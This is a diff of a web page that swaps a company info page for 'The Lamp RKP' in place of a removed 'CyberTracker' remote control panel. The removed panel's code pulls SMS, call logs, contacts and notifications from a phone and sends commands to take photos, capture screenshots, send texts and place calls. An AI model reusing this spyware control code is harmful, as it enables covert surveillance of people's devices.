@@ -3,102 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CyberTracker Control Panel</title>
-    <link rel="stylesheet" href="styles.css">
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+    <title>The Lamp RKP Information | Rahul Kumar Puri</title>
+    <meta name="description" content="if you want to know more about The Lamp RKP then you also should read this page.">
+    <meta name="robots" content="index, follow">
+<meta name="author" content="Rahul Kumar Puri">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Playfair+Display:wght@400;700&display=swap" rel="stylesheet">
+    
+    <!-- External CSS -->
+    <style>
+        /* General Styles */
+        body {
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+
+        /* Header Section */
+        .header {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: white;
+            text-align: center;
+            padding: 50px 20px;
+            font-size: 28px;
+            font-weight: 600;
+        }
+
+        /* Company Info Section */
+        .container {
+            width: 90%;
+            max-width: 900px;
+            margin: 40px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h2 {
+            font-family: 'Playfair Display', serif;
+            font-size: 28px;
+            color: #2a5298;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        /* Company Details */
+        .company-details {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .detail-box {
+            flex: 1;
+            min-width: 250px;
+            margin-bottom: 15px;
+            padding: 15px;
+            background: #eef3f7;
+            border-left: 4px solid #2a5298;
+            border-radius: 5px;
+        }
+
+        .detail-box strong {
+            color: #1e3c72;
+            font-weight: 600;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            background: #2a5298;
+            color: white;
+            margin-top: 30px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+            .header {
+                font-size: 24px;
+            }
+            h2 {
+                font-size: 24px;
+            }
+        }
+    </style>
 </head>
 <body>
-    <h1>CyberTracker - Remote Control Panel</h1>
 
-    <div class="container">
-        <button onclick="fetchDeviceInfo()">📱 Fetch Device Info</button>
-        <button onclick="fetchSMS()">📩 View SMS Logs</button>
-        <button onclick="fetchCallLogs()">📞 View Call Logs</button>
-        <button onclick="fetchContacts()">📖 View Contacts</button>
-        <button onclick="fetchNotifications()">🔔 View Notifications</button>
-        <button onclick="capturePhoto()">📷 Capture Photo</button>
-        <button onclick="takeScreenshot()">🖥 Capture Screenshot</button>
-        <button onclick="sendSMS()">📤 Send SMS</button>
-        <button onclick="makeCall()">📲 Make Call</button>
-        <button onclick="changeWallpaper()">🖼 Change Wallpaper</button>
+    <!-- Header -->
+    <div class="header">
+        Welcome to The Lamp RKP 
     </div>
 
-    <div id="output"></div>
+    <!-- Main Container -->
+    <div class="container">
+        <h2>About The Lamp RKP</h2>
+        <p>
+            The Lamp RKP is a trademark that is not associated with Lamps or bulbs but represents a distinctive brand, it's means The Lamp RKP is only trademark. Founded by Rahul Kumar Puri from Motihari, Bihar.
+"The Lamp RKP Organization" specializes in publishing books and developing innovative technical tools, showcasing a commitment to knowledge and technological advancement.
+        </p>
 
-    <script>
-        // Supabase Config
-        const SUPABASE_URL = "https://YOUR_SUPABASE_PROJECT_URL.supabase.co";
-        const SUPABASE_ANON_KEY = "YOUR_SUPABASE_ANON_KEY";
-        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        <!-- Company Details -->
+        <div class="company-details">
+            <div class="detail-box">
+                <strong>🔹 Company Name:</strong> The Lamp RKP 
+            </div>
+            <div class="detail-box">
+                <strong>🔹 Founder:</strong> Rahul Kumar Puri 
+            </div>
+            <div class="detail-box">
+                <strong>🔹 Established:</strong> 2023
+            </div>
+            <div class="detail-box">
+                <strong>🔹 Headquarters:</strong> Motihari, Bihar
+            </div>
+            <div class="detail-box">
+                <strong>🔹 Industry:</strong> Technology / Books
+            </div>
+            <div class="detail-box">
+                <strong>🔹 Employees:</strong> #SelfMade
+            </div>
+        </div>
+    </div>
 
-        async function fetchDeviceInfo() {
-            let { data, error } = await supabase.from("Device_Info").select("*");
-            if (error) {
-                console.error(error);
-            } else {
-                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
-            }
-        }
+    <!-- Footer -->
+    <div class="footer">
+        © 2025 The Lamp RKP | All Rights Reserved.
+    </div>
 
-        async function fetchSMS() {
-            let { data, error } = await supabase.from("SMS_Logs").select("*");
-            if (error) {
-                console.error(error);
-            } else {
-                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
-            }
-        }
-
-        async function fetchCallLogs() {
-            let { data, error } = await supabase.from("Call_Logs").select("*");
-            if (error) {
-                console.error(error);
-            } else {
-                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
-            }
-        }
-
-        async function fetchContacts() {
-            let { data, error } = await supabase.from("Contacts").select("*");
-            if (error) {
-                console.error(error);
-            } else {
-                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
-            }
-        }
-
-        async function fetchNotifications() {
-            let { data, error } = await supabase.from("Notifications").select("*");
-            if (error) {
-                console.error(error);
-            } else {
-                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
-            }
-        }
-
-        async function capturePhoto() {
-            await supabase.from("Commands").insert([{ action: "capture_photo" }]);
-        }
-
-        async function takeScreenshot() {
-            await supabase.from("Commands").insert([{ action: "take_screenshot" }]);
-        }
-
-        async function sendSMS() {
-            let number = prompt("Enter Phone Number:");
-            let message = prompt("Enter Message:");
-            await supabase.from("Commands").insert([{ action: "send_sms", number: number, message: message }]);
-        }
-
-        async function makeCall() {
-            let number = prompt("Enter Phone Number:");
-            await supabase.from("Commands").insert([{ action: "make_call", number: number }]);
-        }
-
-        async function changeWallpaper() {
-            let imageUrl = prompt("Enter Image URL:");
-            await supabase.from("Commands").insert([{ action: "change_wallpaper", url: imageUrl }]);
-        }
-    </script>
 </body>
 </html>
